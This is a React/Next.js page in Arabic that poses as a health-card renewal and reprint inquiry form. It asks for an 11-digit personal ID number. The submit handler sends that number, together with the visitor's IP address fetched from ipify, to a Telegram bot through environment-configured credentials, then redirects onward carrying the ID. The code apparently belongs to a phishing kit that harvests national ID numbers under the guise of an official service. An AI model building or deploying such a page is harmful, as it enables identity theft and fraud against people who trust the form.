"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function FormPage() {
  const [idNumber, setIdNumber] = useState("");
  const [operationType, setOperationType] = useState("renew");
  const [error, setError] = useState(false);
  const [ipAddress, setIpAddress] = useState(""); // لتخزين عنوان IP
  const router = useRouter();

  useEffect(() => {
    // الحصول على عنوان IP
    const fetchIp = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        setIpAddress(data.ip);
      } catch (error) {
        console.error("Error fetching IP address:", error);
      }
    };

    fetchIp();
  }, []);

  const handleClear = () => {
    setIdNumber("");
    setOperationType("renew");
    setError(false);
  };

  const handleInputChange = (e) => {
    const value = e.target.value;
    // السماح بإدخال الأرقام فقط والتأكد من عدم تجاوز 11 رقمًا
    if (/^\d*$/.test(value) && value.length <= 11) {
      setIdNumber(value);
      setError(false); // إزالة الخطأ عند إدخال قيمة صحيحة
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (idNumber.length === 11) {
      setError(false);

      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const message = `رقم البطاقة: ${idNumber}\nعنوان IP: ${ipAddress}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          router.push(`/apply?idNumber=${idNumber}`);
        } else {
          alert("kkأعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("jjأعد المحاولة حدث خطأ ما");
      }
    } else {
      setError(true);
    }
  };

  return (
    <div className="w-full max-w-md p-4 bg-white rounded">
      <p className="text-md text-gray-600 mb-4">
        طلب الإستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام
        الطلب.
      </p>

      <div className="mb-4">
        <p className="text-2xl py-8 font-bold">المعلومات</p>
        <label className="block text-md font-medium mb-2">
          الرجاء إدخال رقم البطاقة الشخصية:
        </label>
        <input
          type="text"
          value={idNumber}
          onChange={handleInputChange}
          className={`w-full px-4 py-2 border rounded focus:outline-none focus:ring ${
            error ? "border-red-500" : "border-gray-300"
          }`}
          placeholder="12345678909"
        />
        {error && (
          <p className="text-red-500 text-sm mt-1">
            يجب أن يتكون رقم البطاقة من 11 رقمًا.
          </p>
        )}
      </div>

      <div className="mb-4">
        <label className="block text-md font-medium mb-2">نوع العملية:</label>
        <div className="flex flex-col gap-4">
          <label className="flex items-center">
            <input
              type="radio"
              value="renew"
              checked={operationType === "renew"}
              onChange={() => setOperationType("renew")}
              className="ml-2"
            />
            تجديد
          </label>
          <label className="flex items-center">
            <input
              type="radio"
              value="reprint"
              checked={operationType === "reprint"}
              onChange={() => setOperationType("reprint")}
              className="ml-2 color-[#c81048]"
            />
            إعادة الطبع (المفقود أو التالف)
          </label>
        </div>
      </div>

      <div className="w-[100%] flex justify-between items-center py-6 px-6 gap-4">
        <button
          onClick={handleClear}
          className=" w-[40%] px-4 py-2 bg-gray-500 text-white rounded-3xl hover:bg-gray-600"
        >
          تفريغ الحقول
        </button>
        <button
          onClick={handleSubmit}
          className="w-[40%] px-4 py-2 bg-[#c81048] text-white rounded-3xl hover:bg-[#b01b4c]"
        >
          تابع
        </button>
      </div>
    </div>
  );
}
